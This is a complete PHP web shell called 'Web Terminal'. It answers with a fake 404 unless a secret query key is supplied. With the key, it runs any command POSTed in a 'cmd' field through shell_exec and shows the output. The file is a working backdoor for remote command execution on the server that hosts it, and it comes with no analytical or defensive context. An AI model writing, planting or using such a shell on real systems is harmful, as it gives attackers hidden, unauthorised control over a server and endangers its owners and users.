<?php
// Strict security check
if (!isset($_GET['c']) || $_GET['c'] !== '789291') {
    header("HTTP/1.1 404 Not Found");
    exit();
}

$output = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    // Execute any command
    $output = shell_exec($cmd . ' 2>&1'); // capture errors too
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Web Terminal</title>
</head>
<body>
<form action="/?c=789291" method="post">
    <input type="text" name="cmd" style="width:80%;" placeholder="Enter command">
    <button type="submit">Run</button>
</form>

<?php if ($output !== ''): ?>
    <pre><?php echo htmlspecialchars($output); ?></pre>
<?php endif; ?>
</body>
</html>
